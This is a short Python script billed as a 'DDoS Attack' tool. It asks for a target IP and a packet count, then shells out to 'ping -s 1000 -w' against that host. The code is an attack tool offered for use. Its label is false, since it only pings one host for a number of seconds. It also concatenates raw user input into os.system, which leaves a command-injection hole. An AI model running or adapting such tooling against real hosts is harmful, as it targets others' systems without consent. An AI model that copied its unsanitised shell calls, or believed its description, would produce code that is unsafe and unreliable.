#!/usr/bin/python3
# The code write by (Mr.nope)
import os
import time
class color:
    green = '\033[92m'
    red = '\033[91m'
    white = '\033[0m'
time.sleep(1)
os.system("clear")
time.sleep(1)
print(color.green + """
       ____  ____                ___   __  __             __  
      / __ \/ __ \____  _____   /   | / /_/ /_____ ______/ /__
     / / / / / / / __ \/ ___/  / /| |/ __/ __/ __ `/ ___/ //_/
    / /_/ / /_/ / /_/ (__  )  / ___ / /_/ /_/ /_/ / /__/ ,<   
   /_____/_____/\____/____/  /_/  |_\__/\__/\__,_/\___/_/|_| """ + color.red + """
                 (🅓🅓🅞🅢 🅐🅣🅣🅐🅒🅚)
""" + color.white)
print("\t1.start")
print("\t2.Exit")
choose = str(input("\nDDosattack/> "))
if(str(choose) == '1'):
  time.sleep(1)
  os.system("clear")
  time.sleep(1)
  os.system("figlet DDos Attack")
  try2 = str(input("Enter ip: "))
  time.sleep(1)
  try3 = str(input("Enter the number of packets: "))
  time.sleep(2)
  os.system("ping -s 1000 -w " + try3 + " " + try2)
  try4 = str(input("Do you want try again? [y/n] "))
  if(str(try4) == 'y'):
    os.system("python3 ddosattack.py")
  elif(str(try4) == 'n'):
      time.sleep(1)
      os.system("clear")
      time.sleep(1)
      print("good bye")
      exit(1)
  else:
      time.sleep(1)
      os.system("clear")
      time.sleep(1)
      print(color.red + "Error DDosAttack" + color.white)
      time.sleep(2)
      try5 = str(input("press Enter... "))
      if(str(try5) == ''):
        os.system("python3 ddosattack.py")
      else:
          os.system("python3 ddosattack.py")
elif(str(choose) == '2'):
    time.sleep(1)
    os.system("clear")
    time.sleep(1)
    print("good bye")
    exit(1)
else:
    time.sleep(1)
    os.system("clear")
    time.sleep(1)
    print(color.red + "Error DDosAttack!" + color.white)
    time.sleep(1)
    try1 = str(input("press Enter... "))
    if(str(choose) == ''):
      os.system("python3 ddosattack.py")
    else:
        os.system("python3 ddosattack.py")
# DDosAttack     
